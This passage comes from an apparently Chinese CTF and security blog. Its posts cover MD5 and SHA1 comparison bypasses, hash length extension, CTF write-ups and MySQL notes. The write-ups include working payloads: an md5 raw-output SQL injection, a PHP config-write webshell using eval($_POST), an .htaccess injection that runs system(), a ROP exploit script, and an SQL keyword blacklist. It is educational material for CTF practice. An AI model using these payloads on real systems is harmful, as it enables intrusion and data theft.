size=20):\n    global CHARS\n\n    while not stop_event.is_set():\n        rnds = ''.join(random.choice(CHARS) for _ in range(size))\n        rnds1 =rnds+ off\n        md5 = hashlib.md5(rnds1)\n\n        if md5.hexdigest()[start: start+str_len] == substr:\n            print( rnds)\n            stop_event.set()\n\n\nif __name__ == '__main__':\n    substr = sys.argv[1].strip()\n\n    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0\n    off=sys.argv[3]\n    str_len = len(substr)\n    cpus = multiprocessing.cpu_count()\n    stop_event = multiprocessing.Event()\n    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,\n                                         stop_event, str_len,off, start_pos))\n                 for i in range(cpus)]\n\n    for p in processes:\n        p.start()\n\n    for p in processes:\n        p.join()\n```\n\n# 不同文件相同md5\n\nlinux使用md5collgen碰撞生成两个md5值相同但内容不同的文件\n\n```\nmd5collgen -o 1.bin 2.bin\n```\n\nwindows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件\n\n```\nfastcoll.exe -p 123.txt -o 1.txt 2.txt\nfastcoll.exe a.jpg -o 1.jpg 2.jpg\n```\n\n\n# php中md5($str,true)注入\n\n```php\n<?php\n    $password = $_POST['password'];\n    $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n    $result = mysqli_query($link,$sql);\n    if(mysqli_num_rows($result)>0){\n        echo 'Success';\n    }else{\n        echo 'Failure';\n    }\n?>\n```\n\n我们只需要找md5加密后字符串中是否存在`'or'`字符串\n\n比如经典的`ffifdyop`，经过md5加密后`276f722736c95d99e921722cf9ed621c`，转字符串后就包含了`'or'`\n\n![](/img/summary/md5-4.png)\n\n\n其他的例子和exp\n\n```text\nffifdyop\n4SV7p\nbJm4aG\nbNas5p\nckHAEb\n```\n\n```php\n<?php\n$payload = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\nfunction calc_md5_true($s)\n{\n    $md5_true = md5($s,true);\n    if (strpos($md5_true,\"'or'\") !== false){\n        echo $s.PHP_EOL;\n    }\n}\n\nfunction getstr($payload, $s, $slen)\n{\n    if (strlen($s) == $slen) {\n        calc_md5_true($s);\n        return $s;\n    }\n    for ($i = 0; $i < strlen($payload); $i++) {\n\n        $sl = $s . $payload[$i];\n        getstr($payload, $sl, $slen);\n    }\n\n}\n\n//字符串长度从3到30，肯定找得到\nfor ($i = 3; $i < 30; $i++) {\n    getstr($payload, '', $i);\n}\n```\n\n# HASH长度扩展攻击\n\n在`$hash = md5($salt.$data)`中已知`$hash`和`$data`以及`$salt`的长度时\n可以找到另一个`$_hash`和`$_data`使得`$_hash = md5($salt.$_data)`成立\n\n## 已知salt长度\n\n```php\n<?php\nhighlight_file(__FILE__);\ninclude \"./secret_key.php\";\ninclude \"./salt.php\";\n//$salt = XXXXXXXXXXXXXX // the salt include 14 characters\n//md5($salt.\"adminroot\")=e6ccbf12de9d33ec27a5bcfb6a3293df\n@$username = urldecode($_POST[\"username\"]);\n@$password = urldecode($_POST[\"password\"]);\nif (!empty($_COOKIE[\"digest\"])) {\n    if ($username === \"admin\" && $password != \"root\") {\n         if ($_COOKIE[\"digest\"] === md5($salt.$username.$password)) {\n            die (\"The secret_key is \". $secret_key);\n        }\n        else {\n            die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n        }\n    }\n    else {\n        die (\"no no no\");\n    }\n}\n```\n\n使用`hashpump`进行计算\n\n第一行是得到的hash值，即hash(salt+'adminroot')\n第二行是已知数据，即'adminroot'\n第三行是salt长度\n第四行是要添加的数据(这个随意，至少1位以上)\n\n![](/img/summary/md5-5.png)\n\n`\\x`替换为`%`\n\n![](/img/summary/md5-6.png)\n\n\n----------\n\nhashpump的作者删库了，可以使用[hash-ext-attack](https://github.com/shellfeel/hash-ext-attack)或者hexpand代替\n\n\n\n\n\n\n## 未知salt长度\n\n```python\n攻击代码\n\nimport hashpumpy\nimport urllib\nimport requests\nfor i in range(1,30):\n\tm=hashpumpy.hashpump('3a4727d57463f122833d9e732f94e4e0',';\\\"tseug\\\":5:s',';\\\"nimda\\\":5:s',i)\n\tprint i\n\turl='http://120.26.131.152:32778/'\n\tdigest=m[0]\n\n\tmessage=urllib.quote(urllib.unquote(m[1])[::-1])\n\tcookie='role='+message+'; hsh='+digest\n\t#print cookie\n\theaders={\n\t'cookie': cookie,\n\t'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',\n\t'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n\t'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',\n\t'Accept-Encoding': 'gzip, deflate'\n}\n\tprint headers\n\tre=requests.get(url=url,headers=headers)\n\tprint re.text\n\tif \"Welcome\" in re.text:\n\t\tprint re;\n\t\tbreak\n```\n\n```python\n使用说明\n\n>>> import hashpumpy\n>>> help(hashpumpy.hashpump)\nHelp on built-in function hashpump in module hashpumpy:\nhashpump(...)\n    hashpump(hexdigest, original_data, data_to_add, key_length) -> (digest, message)\n    Arguments:\n        hexdigest(str):      Hex-encoded result of hashing key + original_data.\n        original_data(str):  Known data used to get the hash result hexdigest.\n        data_to_add(str):    Data to append\n        key_length(int):     Length of unknown data prepended to the hash\n    Returns:\n        A tuple containing the new hex digest and the new message.\n>>> hashpumpy.hashpump('ffffffff', 'original_data', 'data_to_add', len('KEYKEYKEY'))\n('e3c4a05f', 'original_datadata_to_add')\n```","tags":["总结","md5"],"categories":["总结"]},{"title":"Hackergame 2021-图之上的信息-wp","url":"/posts/f5b82e4/","content":"\n\n# 题目 #\n小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。\n你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？\n\n\n# 资料 #\n谷歌找到的一篇[文章](https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/)\n查所有可用的字段\n![](/img/wp/2021/2021hackergame-1.png)\n\n\n# 解题 #\n先guest/guest登陆\n然后在`/graphql`接口中查到需要的email字段\n![](/img/wp/2021/2021hackergame-2.png)\n\n最后查询 `{\"query\":\"{ user(id:1) { privateEmail }}\"}` 即可得到 flag。\n![](/img/wp/2021/2021hackergame-3.png)","tags":["wp","2021竞赛","hackergame"],"categories":["wp"]},{"title":"第四届浙江省大学生网络与信息安全竞赛决赛-WP","url":"/posts/8bf1ff96/","content":"\n\n# Web\n\n## 远古特性\n\nweb签到题，代码如下\n\n```php\n<?php\n\n// Present from glzjin :)\n\nhighlight_file(__FILE__);\n\n$file = $_GET['file'];\n\nif(preg_match('/^hint\\/hint.txt$/m', $file)) {\n    echo file_get_contents($file);\n} else {\n    echo \"Try again!\";\n}\n```\n\n主要是符合条件`hint/hint.txt`后换行直接读取文件，`%0a`绕过\n\n![](/img/wp/2021/2021zhejiang-1.png)\n\n# Pwn\n\n## sai_easy\n\npwn签到题\n分析文件\n\n![](/img/wp/2021/2021zhejiang-2.png)\n\nexp:\n```python\nfrom pwn import *\n#p=process('sai_easy_pwn')\np=remote('89563411-fd49-4df0-a394-13757851c159.zj-ctf.dasctf.com',53100)\nstr_bin=0x601098\nsys_add=0x400760\npop_rdi=0x0000000000400b23\np.send(b'a'*0x30)\n#p.send(b'a'*0x10+b'b'*8+p64(pop_rdi)+p64(str_bin)+p64(sys_add))\np.send(b'a'*0x10+b'b'*8+p64(0x40098e))\n#p.send(b'a'*0x30)\n#p.send(b'a'*0x8+p64(sys_add)+p64(0x6010e0)+p64(pop_rdi)+p64(str_bin)+p64(0x0000000000400aa4))\np.interactive()\n```\n\n# Reverse\n\n## preprocess\n\n通过对c文件的分析发现实际上有一种类似base64的效果\n将字符串每三个字节按照六位一组进行分隔\n先进行取反\n然后对这六位二进制进行换位操作\n然后进行对照 如果不相同编译时就会报错\n\n```python\nf=open('data.txt')\nimport re\nd=f.read()\ne=re.findall(' \\^ (.+)',d)\ndata=''\nfor i in e:\n    cache=bin(int(i))[2:].zfill(6)\n    for j in [3,1,5,0,4,2]:\n        if cache[j]=='1':\n            data+='0'\n        else:\n            data+='1'\nprint(data)\nflag=int(data,2)\nimport base64\nprint(hex(flag)[2:].upper())\nprint(base64.b16decode(hex(flag)[2:].upper().strip('L')))\n```\n\n## 最简单的逆向\n\n分析文件\n\n![](/img/wp/2021/2021zhejiang-3.png)\n\n```\na=[chr(0x76-50),chr(0x73-50),chr(0x85-50),chr(0x75-50),chr(0x86-50),chr(0x78-50),chr(0xAD-50),chr(0x6B-50),chr(0x97-50),chr(0x68-50),chr(0x98-50),chr(0x67-50),chr(0x64-50),chr(0x64-50),chr(0x62-50),chr(0x97-50),chr(0x68-50),chr(0x98-50),chr(0x6B-50),chr(0x6B-50),chr(0x96-50),chr(0x67-50),chr(0x62-50),chr(0x69-50),chr(0x95-50),chr(0x96-50),chr(0x65-50),chr(0x96-50),chr(0x6A-50),chr(0x69-50),chr(0x69-50),chr(0x65-50),chr(0x66-50),chr(0x97-50),chr(0x68-50),chr(0x98-50),chr(0x6A-50),chr(0x95-50),chr(0x68-50),chr(0xAF-50)]\nprint(''.join(a))\n```\n\n![](/img/wp/2021/2021zhejiang-4.png)\n\n# Crypto\n\n## decode_and_decode\n\n简单的base嵌套\n\n```python\nimport base64\nb1=base64.b64decode\nb2=base64.b32decode\nf=open('decode_and_decode.txt')\nf=f.read()\nwhile 1:\n    try:\n        f=base64.b16decode(f)\n    except:\n        try:\n            f=base64.b32decode(f)\n        except:\n            try:\n                f=base64.b64decode(f)\n            except:\n                break\nprint(f)\n```\n\n# Misc\n\n## asoul_lover\n\n从pdf中得到名字和生日，互相组合一下\n\n![](/img/wp/2021/2021zhejiang-5.png)\n\n密码为向晚0612\n\n## site_log\n\n分析文件发现evil.php文件比较可疑\n\n```python\nf=open('my_site.log')\nd=f.readlines()\nfor i in d:\n    if 'evil.php' in i:\n        print(i)\n```\n\n使用脚本获取evil.php文件的日志\n\n![](/img/wp/2021/2021zhejiang-6.png)\n\n```python\nprint(''.join([chr(122),chr(105),chr(112),chr(32),chr(45),chr(114),chr(80),chr(32),chr(104),chr(101),chr(104),chr(101),chr(104),chr(101),chr(50),chr(51),chr(51),chr(95),chr(73),chr(103),chr(111),chr(116),chr(114),chr(111),chr(111),chr(116),chr(32),chr(102),chr(108),chr(97),chr(103),chr(46),chr(122),chr(105),chr(112),chr(32),chr(102),chr(108),chr(97),chr(103)]))\n```\n\n![](/img/wp/2021/2021zhejiang-7.png)\n\n密码为hehehe233_Igotroot\n\n\n","tags":["wp","2021竞赛","浙江"],"categories":["wp"]},{"title":"Cardinal平台部署","url":"/posts/f7d25d2e/","content":"\n\n\n# 环境要求 #\n如果是团队内部局域网比赛一个虚拟机就够用了，甚至靶机都可以部署在同一台上，文中虚拟机为centos7\n平台本身可以不需要docker，但靶机大部分需要docker环境，文中docker版本为20.10.9\n还需要有一个数据库来存数据，这里用到是mysql\n\n\n# 安装mysql #\n安装mysql\n`yum -y install mariadb-server mariadb`\n设置mysql开机自启动和启动mysql\n`systemctl start mariadb && systemctl enable mariadb`\n设置mysql root用户密码\n`mysqladmin -u root password 123456`\n进入数据库\n`mysql -u root -p123456`\n创建数据库，注意编码\n``create database `cardinal` default character set utf8mb4 collate utf8mb4_unicode_ci;``\n\n\n# 安装Cardinal #\n首先[下载](https://github.com/vidar-team/Cardinal/releases)对应的安装包\n![](/img/awd/Cardinal-2.jpg)\n\n解压\n`tar -zxvf Cardinal_v0.7.3_linux_amd64.tar.gz`\n![](/img/awd/Cardinal-3.jpg)\n\n运行\n`./Cardinal`\n如果没有权限需要添加执行权限`chmod +x ./Cardinal`\n\n\n# Cardinal配置 #\n根据提示来即可\n![](/img/awd/Cardinal-4.jpg)\n\n管理地址\n`http://ip:port/manager/`\n\n\n\n# 靶机配置 #\n找个docker-awd靶机\n这里以`glzjin/20190511_awd_docker_b4`为例子\n\n下载靶机\n`docker pull glzjin/20190511_awd_docker_b4`\n![](/img/awd/Cardinal-5.jpg)\n\n以三个队伍（lewiserii,rot,whatisup）为例\n创建三个靶机\n分别开放80和22端口\n![](/img/awd/Cardinal-6.jpg)\n\n\n# 比赛前题目配置 #\n先添加三个队伍\n![](/img/awd/Cardinal-7.jpg)\n\n创建题目\n![](/img/awd/Cardinal-8.jpg)\n\n添加靶机，注意ssh是root，因为没权限会写不进flag\n![](/img/awd/Cardinal-9.jpg)\n\n生成flag\n![](/img/awd/Cardinal-10.jpg)\n\n更改靶机root密码\n![](/img/awd/Cardinal-11.jpg)\n\n写入flag和验证靶机\n![](/img/awd/Cardinal-12.jpg)\n\n\n# 开始比赛 #\n选手用事先定义的账号密码登录`http://ip:port`即可\n![](/img/awd/Cardinal-13.png)","tags":["awd","平台搭建部署","docker"],"categories":["awd"]},{"title":"【buuctf】加固题-Ezsql","url":"/posts/b7823512/","content":"\n\n第一次做到这种类型的题目，挺有意思的\n\n# 连接 #\n首先ssh连上靶机\n![](/img/buuctf/Ezsql-1.jpg)\n\n# 代码审计 #\n进入网站根目录`/var/www/html`\n![](/img/buuctf/Ezsql-2.jpg)\n\n查看`dbConnect.php`\n发现只是连接数据库的\n![](/img/buuctf/Ezsql-3.jpg)\n\n再看`index.php`\n看到核心代码没有任何过滤\n![](/img/buuctf/Ezsql-4.jpg)\n\n# 方法1 #\n## addslashes函数 ##\n`addslashes($string)`：用反斜线引用字符串中的特殊字符' \" \\\n\n## 防护 ##\n将username和password处理一下\n![](/img/buuctf/Ezsql-5.jpg)\n\n# 方法2 #\n## 黑名单替换 ##\n设置一个黑名单\n`$blacklist = [\">\",\";\",\"|\",\"union\",\"select\",\"or\",\"#\",\"--+\",\"%\",\"'\",\" \"];`\n\n\n## 防护 ##\n`$username = str_replace($blacklist,\"\",$username);`\n`$password = str_replace($blacklist,\"\",$password);`\n\n\n\n# check #\n检测通过\n![](/img/buuctf/Ezsql-6.jpg)\n","tags":["buuctf","awdp"],"categories":["wp"]},{"title":"sha1强比较绕过","url":"/posts/5da2ae7c/","content":"\n\n# 例1 #\n只判断两个值不能相等的情况\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nif (isset($_GET['name']) and isset($_GET['password']))\n{\n    if ($_GET['name'] == $_GET['password'])\n        echo 'Your password can not be your name!';\n    else if (sha1($_GET['name']) === sha1($_GET['password']))\n      die('welcome');\n    else\n        echo 'Invalid password.';\n}\nelse\n    echo 'Login first!';\n?>\n```\n可以使用数组来绕过\n![](/img/php/sha1-1.jpg)\n这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回NULL，if 条件成立\n\n# 例2 #\n既判断了两个值不能相等，又判断了是否为数组\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nif (isset($_GET['name']) and isset($_GET['password']))\n{\n    if ($_GET['name'] == $_GET['password'])\n        echo 'Your password can not be your name!';\n    else if(is_array($_GET['name']) || is_array($_GET['password']))\n        die('There is no way you can sneak me, young man!');\n    else if (sha1($_GET['name']) === sha1($_GET['password'])){\n      die('yes');\n    }\n    else\n        echo 'Invalid password.';\n}else\n    echo 'Login first!';\n?>\n```\n这样只能找两个sha1值相等的\n找到google放出两个SHA1值相同而不一样(SHA256的值不通)的pdf文件\n[具体分析](https://blog.csdn.net/caiqiiqi/article/details/68953730)\n[shattered-1.pdf](https://shattered.it/static/shattered-1.pdf)\n```\n%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1\n```\n[shattered-2.pdf](https://shattered.it/static/shattered-2.pdf)\n```\n%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1\n```\n满足所有条件\n![](/img/php/sha1-2.jpg)\n","tags":["总结","php","bypass"],"categories":["php"]},{"title":"mysql从入门到入土（六）","url":"/posts/8461dbd1/","content":"\n\n# 主从备份 #\n\n## 环境 ##\n\n主数据库：10.10.10.1   db1\n从数据库：10.10.10.2   db2\n\nmariadb版本越高越好\n\n关闭firewalld和selinux或者开启对应规则\n\n## 更改密码和设置权限 ##\n\n`mysql_secure_installation`\n\ndisallow root login remotely需要选n，其他y\n![](/img/数据库/mysql6-1.jpg)\n\n\n## 编辑配置文件 ##\n`vim /etc/my.cnf.d/server.cnf`\n\n在mysqld下写入如下设置\n\ndb1中\n```\n[mysqld]\nlog_bin = mysql-bin  //[必须]启用二进制日志\nserver_id = 1        //[必须]服务器唯一ID，默认是1，一般取IP最后一段\n```\n\ndb2中\n```\n[mysqld]\nlog_bin = mysql-bin\nserver_id = 2\n```\n\n## 在db1上授权 ##\n\n`grant replication slave on *.* to 'user'@'192.168.1.2' identified by \"123456\";`\n\n![](/img/数据库/mysql6-2.jpg)\n\n\n## 在db2上匹配用户信息并启用进程 ##\n\n`change master to master_host=\"192.168.1.1\",master_user=\"user\",master_password=\"123456\";`\n\n`start slave`\n\n![](/img/数据库/mysql6-3.jpg)\n\n\n## 查看状态 ##\n\n`show  slave  status\\G;`\n\n![](/img/数据库/mysql6-4.jpg)\n\n注：slave_io_running及slave_sql_running进程必须正常运行，即YES状态，否则都是错误的状态。","tags":["基础知识","mysql"],"categories":["mysql"]},{"title":"mysql从入门到入土（五）","url":"/posts/e16f9008/","content":"\n\n# 索引 #\n\n>索引是一种特殊的数据库结构，由数据表中的一列或多列组合而成，可以用来快速查询数据表中有某一特定值的记录。\n\n>使用索引可以很大程度上提高数据库的查询速度，还有效的提高了数据库系统的性能。\n\n## 创建索引 ##\n\n方法一：\n`create index <索引名> on <表名> (<列名> [<长度>] [ ASC | DESC])`\n\n1: 在一个已有的表上创建索引，但是这个语句不能创建主键\n2: 一个表可以创建多个索引，但每个索引在该表中的名称是唯一的\n3: 列名和长度是可选项\n4: asc指定索引按照升序来排列，desc指定索引按照降序来排列，默认为ASC\n\n\n![](/img/数据库/mysql5-1.png)\n\n\n\n\n方法二：\n创建表的时候同时创建索引\n\n\n方法三：\n`alter table <name> add [UNIQUE | FULLTEXT] [INDEX] 索引名(列名)`\n\n与`create index`语句差不多\n`unique|fulltext`为可选参数，分别表示唯一索引、全文索引\n\n\n\n![](/img/数据库/mysql5-2.png)\n\n\n\n\n## 删除索引 ##\n\n方法一：\n`drop index <索引名> on <表名>`\n\n\n方法二：\n`alter table <表名> drop index <索引名>`\n\n\n## 查看索引 ##\n\n`show index from <表名> [ from <数据库名>]`\n\n![](/img/数据库/mysql5-3.png)\n\n![](/img/数据库/mysql5-4.png)\n\n\n\n\n# 常用运算符 #\n\n\n## 算术运算符 ##\n\n![](/img/数据库/mysql5-5.png)\n\n## 逻辑运算符 ##\n\n![](/img/数据库/mysql5-6.png)\n\n## 比较运算符 ##\n\n![](/img/数据库/mysql5-7.png)\n\n## 位运算符 ##\n\n![](/img/数据库/mysql5-8.png)\n\n\n","tags":["基础知识","mysql"],"categories":["mysql"]},{"title":"【ctfshow】web入门-大赛原题","url":"/posts/bb1e6cfa/","content":"\n做一题更新一题吧\n\n# WEB692 #\n绕过addslashes并写入文件配置getshell\n题目代码\n```php\n<?php\n\nhighlight_file(__FILE__);\n\nif(!isset($_GET['option'])) die();\n$str = addslashes($_GET['option']);\n$file = file_get_contents('./config.php');\n$file = preg_replace('|\\$option=\\'.*\\';|', \"\\$option='$str';\", $file);\nfile_put_contents('./config.php', $file);\n```\n\n首先看一下addslashes() 函数的作用：\naddslashes() 函数会将预定义的字符前添加反斜杠字符串\n预定义字符有`单引号，双引号，反斜杠，NULL`四个\n效果如图，会添加上`\\`\n![](/img/ctfshow/web入门/addslashes.png)\n\n所以当我们传入`?option=a\\';phpinfo();//`时\n会变为`a\\\\\\';phpinfo();//`\n\n接着看preg_replace函数\n`preg_replace($pattern, $replacement, $string);`\n搜索string中匹配pattern的部分，以replacement进行替换。\n\n最终config.php的内容为\n```\n<?php\n$option='a\\\\';phpinfo();//';\n```\n这样就构造了一个phpinfo();\n![](/img/ctfshow/web入门/web692-1.png)\n\n所以直接上传php马\n`?option=a\\';eval($_POST[a]);//`\n\n![](/img/ctfshow/web入门/web692-2.png)\n\n\n# WEB701 #\n出自`HarekazeCTF2019-A_Z`\n源码\n```js\nconst express = require('express');\nconst path = require('path');\nconst vm = require('vm');\n\nconst app = express();\n\napp.set('views', path.join(__dirname, 'views'));\napp.set('view engine', 'pug');\n\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.get('/', function (req, res, next) {\n  let output = '';\n  const code = req.query.code + '';\n  if (code && code.length < 200 && !/[^a-z().]/.test(code)) {\n    try {\n      const result = vm.runInNewContext(code, {}, { timeout: 500 });\n      if (result === 1337) {\n        output = process.env.FLAG;\n      } else {\n        output = 'nope';\n      }\n    } catch (e) {\n      output = 'nope';\n    }\n  } else {\n    output = 'nope';\n  }\n  res.render('index', { title: '[a-z().]', output });\n});\n\napp.get('/source', function (req, res) {\n  res.sendFile(path.join(__dirname, 'app.js'));\n});\n\nmodule.exports = app;\n```\n我们只能使用[a-z().]这些字符构造出`1337`\n```js\nif (result === 1337) {\n        output = process.env.FLAG;\n      }\n```\n\n我们可以用`(typeof(this)).constructor()`构造出空字符串，而JS中1==true，所以`(typeof(this)).constructor().length.constructor(true)`就会构造出1，或者`true.constructor.length`。3可以用字符串的big()方法的name.length获得，7可以用`true.constructor.name.length`得到。最后将所有字符concat在一起即可。\n\n所以最后Payload（不唯一）：`eval((typeof(this)).constructor().concat(true.constructor.length).concat((typeof(this)).big.name.length).concat((typeof(this)).big.name.length).concat(true.constructor.name.length))`\n\n# WEB712 #\n出自`XNUCA 2019 EasyPHP`\n\n题目给了源码\n```php\n<?php\n    $files = scandir('./');\n    foreach($files as $file) {\n        if(is_file($file)){\n            if ($file !== \"index.php\") {\n                unlink($file);\n            }\n        }\n    }\n    include_once(\"fl3g.php\");\n    if(!isset($_GET['content']) || !isset($_GET['filename'])) {\n        highlight_file(__FILE__);\n        die();\n    }\n    $content = $_GET['content'];\n    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {\n        echo \"Hacker\";\n        die();\n    }\n    $filename = $_GET['filename'];\n    if(preg_match(\"/[^a-z\\.]/\", $filename) !== 0) {\n        echo \"Hacker\";\n        die();\n    }\n    $files = scandir('./');\n    foreach($files as $file) {\n        if(is_file($file)){\n            if ($file !== \"index.php\") {\n                unlink($file);\n            }\n        }\n    }\n    file_put_contents($filename, $content . \"\\nJust one chance\");\n?>\n```\n2-9,25-32行的意思是删除除了文件名是index.php的文件\n10行包含了fl3g.php文件\n16-19对content参数，也就是文件内容进行了关键词过滤\n21-24对filename参数进行了正则过滤，使文件名只允许出现a-z和点\n\n分析完后发现好像对我们写shell没什么影响\n。。传完后发现不能解析，应该是出题的时候设置了只能解析index.php\n![](/img/ctfshow/web入门/web712-1.png)\n\n\n这个时候想到了之前做文件上传时经常用到的`.htaccess`，直接设置`AddType`或者`SetHandler`不就行了吗,但是回过去看那些看似无用的关键词过滤，实际上把这两种情况禁用了\n\n而且内容中还拼接了`Just one chance`,在`.htaccess`中会报错，所以要把它注释掉，先利用`\\`拼接上下两行，再用`#`注释\n\n既然可以用`\\`，那么也就可以绕过过滤了，从而写入被限制的内容\n\n```python\n@autor: Iv4n\n\nimport requests\n\nurl = 'http://f47cd164-0248-4cca-993d-8610c32a4aa1.challenge.ctf.show/'\nr = requests.get(url+'?filename=.htaccess&content=php_value%20auto_prepend_fi\\%0Ale%20\".htaccess\"%0AErrorDocument%20404%20\"<?php%20system(\\'cat%20../../../fl[a]g\\');?>\\\\')\nprint(r.text)\n```\n\n`php_value auto_prepend_file`将自身加载到index.php，然后写一句话木马，直接写的话会导致500，所以通过`ErrorDocument 404`\n\n![](/img/ctfshow/web入门/web712-2.png)\n\n\n\n\n\n# WEB720 #\n\nsha1的强比较\n```php\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\nif (isset($_GET['name']) and isset($_GET['password'])) {\n    if ($_GET['name'] == $_GET['password'])\n        echo '<p>Your password can not be your name!</p>';\n    else if (sha1($_GET['name']) === sha1($_GET['password']))\n      die('Flag: '.$flag);\n    else\n        echo '<p>Invalid password.</p>';\n}\nelse{\n    highlight_file(__FILE__);\n}\n```\n找到两个sha1后相等的值即可\n```\n?name=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1\n```\n\n# WEB721 #\n\n\nF12看源码\n```php\n<!-- CTFSHOW hint:\n      if (($row[pass]) && (!strcasecmp(md5($pass), $row[pass]))) {\n              echo \"<p>Logged in! \".$flag.\" </p>\";\n        }\n-->\n```\n\n从数据库中提取出pass 然后逻辑与 与右边的(!strcasecmp(\\$pass, $row[pass])) 两条语句都为真才会打印出flag\n\n\n\n构造一个联合查询:这样第一条语句查询`a`这个用户查不到,然后第二个根据特性会返回这个结果到password字段下\n\npayload：\n```\nusername:a' union select md5(1)#\npassword:1\n```\n\n# WEB726 #\n\nF12看源码\n跟WEB692一样，是Php写入配置文件的经典漏洞\n```php\n<!-- CTFSHOW hint:\n        $file = file_get_contents('config.php');\n        $file = preg_replace('|\\$db=\\'.*\\';|', \"\\$db='$username';\", $file);\n        file_put_contents('config.php', $file);\n-->\n```\n\n但是用692的方法做不出来，这里用其他方法（利用 preg_replace() 